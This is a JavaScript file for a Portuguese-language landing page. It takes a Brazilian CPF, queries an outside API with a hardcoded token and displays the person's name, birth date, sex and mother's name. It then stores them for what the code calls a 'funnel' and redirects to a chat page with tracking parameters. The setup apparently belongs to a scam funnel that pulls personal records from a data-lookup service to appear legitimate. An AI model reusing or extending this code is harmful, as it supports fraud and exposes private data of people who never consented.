document.addEventListener("DOMContentLoaded", function () {
  // Elementos principais
  const mainPage = document.getElementById("mainPage");
  const cpfPage = document.getElementById("cpfPage");
  const btnAtivar = document.getElementById("btnAtivar");
  const btnVoltar = document.getElementById("btnVoltar");
  const btnAnalisar = document.getElementById("btnAnalisar");
  const btnSimular = document.getElementById("btnSimular");

  // Elementos de formulário
  const cpfInputPage = document.getElementById("cpfInputPage");
  const termsCheck = document.getElementById("termsCheck");

  // Elementos de resultado da consulta
  const consultaResultado = document.getElementById("consultaResultado");
  const loadingInfo = document.getElementById("loadingInfo");
  const userInfo = document.getElementById("userInfo");
  const errorInfo = document.getElementById("errorInfo");
  const errorMessage = document.getElementById("errorMessage");
  const btnConfirmar = document.getElementById("btnConfirmar");
  const btnCorrigir = document.getElementById("btnCorrigir");
  const btnTentarNovamente = document.getElementById("btnTentarNovamente");

  // Campos de informação do usuário
  const nomeUsuario = document.getElementById("nomeUsuario");
  const dataNascimento = document.getElementById("dataNascimento");
  const cpfUsuario = document.getElementById("cpfUsuario");
  const sexoUsuario = document.getElementById("sexoUsuario");
  const nomeMae = document.getElementById("nomeMae");

  // Obter parâmetros UTM
  function getUTMParams() {
    const urlParams = new URLSearchParams(window.location.search);
    const utmParams = {};

    [
      "utm_source",
      "utm_medium",
      "utm_campaign",
      "utm_content",
      "utm_term",
      "utm_id",
      "xcod",
    ].forEach((param) => {
      if (urlParams.has(param)) {
        utmParams[param] = urlParams.get(param);
      }
    });

    return utmParams;
  }

  // Formatação dos parâmetros UTM
  function formatUTMParams(params) {
    return Object.keys(params)
      .map(
        (key) => `${encodeURIComponent(key)}=${encodeURIComponent(params[key])}`
      )
      .join("&");
  }

  // Formatar CPF enquanto digita
  function formatCPF(input) {
    let value = input.value.replace(/\D/g, "");
    if (value.length > 11) value = value.slice(0, 11);

    if (value.length > 9) {
      value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
    } else if (value.length > 6) {
      value = value.replace(/^(\d{3})(\d{3})(\d{1,3})$/, "$1.$2.$3");
    } else if (value.length > 3) {
      value = value.replace(/^(\d{3})(\d{1,3})$/, "$1.$2");
    }

    input.value = value;
  }

  // Validar CPF
  function validateCPF(cpf) {
    cpf = cpf.replace(/\D/g, "");
    return cpf.length === 11;
  }

  // Formatação de data (YYYYMMDD para DD/MM/YYYY ou deixa como está se já estiver formatada)
  function formatDate(dateString) {
    if (!dateString) return "Não informado";

    if (dateString.includes("/")) {
      return dateString;
    }

    if (dateString.length === 8) {
      return dateString.replace(/^(\d{4})(\d{2})(\d{2})$/, "$3/$2/$1");
    }

    return dateString;
  }

  // Consultar CPF na API (APIDAT)
  async function consultarCPF(cpf) {
    consultaResultado.classList.remove("hidden");
    loadingInfo.classList.remove("hidden");
    userInfo.classList.add("hidden");
    errorInfo.classList.add("hidden");

    consultaResultado.scrollIntoView({ behavior: "smooth", block: "center" });

    try {
      const resp = await fetch(`https://api.amnesiatecnologia.rocks/?token=c5eebbc9-0469-4324-85f6-0c994b42d18a&cpf=${cpf}`);
      if (!resp.ok) throw new Error(`Erro na consulta: ${resp.status}`);
      const data = await resp.json();

      loadingInfo.classList.add("hidden");

      // Normalizar resposta (campos esperados)
      const row = (data && data.DADOS) ? data.DADOS : {};
      const dadosPessoa = {
        NOME: row.nome || "",
        NASC: row.data_nascimento || "",
        CPF: row.cpf || cpf,
        SEXO: row.sexo || "",
        NOME_MAE: row.nome_mae || "",
      };

      // Preencher UI
      nomeUsuario.textContent = dadosPessoa.NOME || "Não informado";
      dataNascimento.textContent = formatDate(dadosPessoa.NASC);
      cpfUsuario.textContent = dadosPessoa.CPF
        ? dadosPessoa.CPF.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4")
        : "Não informado";

      let sexoUser = dadosPessoa.SEXO;
      if (sexoUser === "MASCULINO") sexoUser = "Masculino";
      else if (sexoUser === "FEMININO") sexoUser = "Feminino";
      sexoUsuario.textContent = sexoUser || "Não informado";

      nomeMae.textContent = dadosPessoa.NOME_MAE || "Não informado";

      // Salvar no localStorage para o funil inteiro
      const userData = {
        nome: dadosPessoa.NOME,
        dataNascimento: dadosPessoa.NASC,
        nomeMae: dadosPessoa.NOME_MAE,
        cpf: dadosPessoa.CPF,
        sexo: sexoUser,
      };
      localStorage.setItem("dadosUsuario", JSON.stringify(userData));
      if (dadosPessoa.NOME) localStorage.setItem("nomeUsuario", dadosPessoa.NOME);
      if (dadosPessoa.CPF) localStorage.setItem("cpfUsuario", dadosPessoa.CPF);

      // Exibir bloco de infos
      userInfo.classList.remove("hidden");
      setTimeout(() => {
        userInfo.scrollIntoView({ behavior: "smooth", block: "center" });
      }, 100);
    } catch (error) {
      loadingInfo.classList.add("hidden");
      errorMessage.textContent =
        error.message || "Ocorreu um erro ao consultar seus dados.";
      errorInfo.classList.remove("hidden");
      errorInfo.scrollIntoView({ behavior: "smooth", block: "center" });
    }
  }

  // Verificar se existe CPF na URL e salvar no localStorage
  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.has("cpf")) {
    const cpfFromUrl = urlParams.get("cpf").replace(/\D/g, "");
    if (validateCPF(cpfFromUrl)) {
      localStorage.setItem("cpf", cpfFromUrl);
      console.log("CPF da URL salvo no localStorage:", cpfFromUrl);
    }
  }

  function showCPFPage() {
    mainPage.classList.add("fade-out");

    setTimeout(() => {
      mainPage.classList.add("hidden");
      cpfPage.classList.remove("hidden");
      void cpfPage.offsetWidth;
      cpfPage.classList.add("fade-in");
      cpfPage.classList.remove("opacity-0");
      cpfInputPage.focus();
    }, 400);
  }

  function showMainPage() {
    cpfPage.classList.remove("fade-in");
    cpfPage.classList.add("opacity-0");

    setTimeout(() => {
      cpfPage.classList.add("hidden");
      mainPage.classList.remove("hidden");
      void mainPage.offsetWidth;
      mainPage.classList.remove("fade-out");
    }, 400);
  }

  function processForm() {
    const cpf = cpfInputPage.value.replace(/\D/g, "");

    if (!validateCPF(cpf)) {
      alert("Por favor, digite um CPF válido (11 dígitos).");
      return;
    }

    if (!termsCheck.checked) {
      alert(
        "Você precisa concordar com os Termos de Uso e Política de Privacidade para continuar."
      );
      return;
    }

    localStorage.setItem("cpf", cpf);
    console.log("CPF salvo no localStorage:", cpf);

    consultarCPF(cpf);
  }

  function redirecionarParaChat() {
    const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
    if (!dadosUsuarioJSON) {
      alert("Dados do usuário não encontrados. Por favor, tente novamente.");
      return;
    }

    try {
      const dadosUsuario = JSON.parse(dadosUsuarioJSON);
      if (!dadosUsuario.cpf) {
        alert("CPF não encontrado. Por favor, tente novamente.");
        return;
      }

      const cpf = dadosUsuario.cpf.replace(/\D/g, "");
      const urlAtual = new URLSearchParams(window.location.search);
      const novaUrl = new URLSearchParams();
      for (const [chave, valor] of urlAtual.entries()) {
        novaUrl.append(chave, valor);
      }
      novaUrl.set("cpf", cpf);
      window.location.href = `./chat/index.html?${novaUrl.toString()}`;
    } catch (error) {
      console.error("Erro ao processar dados para redirecionamento:", error);
      alert(
        "Ocorreu um erro ao processar seus dados. Por favor, tente novamente."
      );
    }
  }

  function corrigirDados() {
    consultaResultado.classList.add("hidden");
    cpfInputPage.focus();
  }

  function tentarNovamente() {
    consultaResultado.classList.add("hidden");
    cpfInputPage.focus();
  }

  btnAtivar.addEventListener("click", showCPFPage);
  btnSimular.addEventListener("click", showCPFPage);
  btnVoltar.addEventListener("click", showMainPage);
  btnAnalisar.addEventListener("click", function () {
    console.log("Botão Analisar clicado");
    console.log("Valor do CPF antes do processamento:", cpfInputPage.value);
    processForm();
  });

  if (btnConfirmar) {
    btnConfirmar.addEventListener("click", redirecionarParaChat);
  }

  if (btnCorrigir) {
    btnCorrigir.addEventListener("click", corrigirDados);
  }

  if (btnTentarNovamente) {
    btnTentarNovamente.addEventListener("click", tentarNovamente);
  }

  cpfInputPage.addEventListener("input", function () {
    formatCPF(this);
    console.log("CPF formatado durante digitação:", this.value);
  });

  // Carrossel (inalterado)
  const carousel = document.getElementById("carousel");
  const slides = document.querySelectorAll(".carousel-item");
  const indicators = document.querySelectorAll(".carousel-indicator");
  const prevBtn = document.getElementById("prev-btn");
  const nextBtn = document.getElementById("next-btn");

  const stepNumbers = document.querySelectorAll(".step-number");
  const stepLines = document.querySelectorAll(".step-line");

  let currentSlide = 0;
  let autoSlideInterval;

  function showSlide(index) {
    if (index < 0) {
      index = slides.length - 1;
    } else if (index >= slides.length) {
      index = 0;
    }

    slides.forEach((slide) => {
      slide.classList.remove("active");
    });

    slides[index].classList.add("active");

    indicators.forEach((indicator, i) => {
      if (i === index) {
        indicator.classList.add("active");
      } else {
        indicator.classList.remove("active");
      }
    });

    updateSteps(index);

    currentSlide = index;
  }

  function updateSteps(index) {
    stepNumbers.forEach((step, i) => {
      step.classList.remove("active", "completed");

      if (i === index) {
        step.classList.add("active");
      } else if (i < index) {
        step.classList.add("completed");
      }
    });

    stepLines.forEach((line, i) => {
      if (i < index) {
        line.classList.add("active");
      } else {
        line.classList.remove("active");
      }
    });
  }

  function nextSlide() {
    showSlide(currentSlide + 1);
    resetAutoSlide();
  }

  function prevSlide() {
    showSlide(currentSlide - 1);
    resetAutoSlide();
  }

  function startAutoSlide() {
    autoSlideInterval = setInterval(nextSlide, 5000);
  }

  function resetAutoSlide() {
    clearInterval(autoSlideInterval);
    startAutoSlide();
  }

  if (prevBtn && nextBtn) {
    nextBtn.addEventListener("click", nextSlide);
    prevBtn.addEventListener("click", prevSlide);

    indicators.forEach((indicator, index) => {
      indicator.addEventListener("click", () => {
        showSlide(index);
        resetAutoSlide();
      });
    });

    stepNumbers.forEach((step) => {
      step.addEventListener("click", () => {
        const stepIndex = parseInt(step.getAttribute("data-step"));
        showSlide(stepIndex);
        resetAutoSlide();
      });
    });

    let touchStartX = 0;

    carousel.addEventListener(
      "touchstart",
      (e) => {
        touchStartX = e.changedTouches[0].screenX;
      },
      { passive: true }
    );

    carousel.addEventListener(
      "touchend",
      (e) => {
        const touchEndX = e.changedTouches[0].screenX;
        const diff = touchEndX - touchStartX;

        if (diff > 50) {
          prevSlide();
        } else if (diff < -50) {
          nextSlide();
        }
      },
      { passive: true }
    );

    showSlide(0);
    startAutoSlide();
  }
});
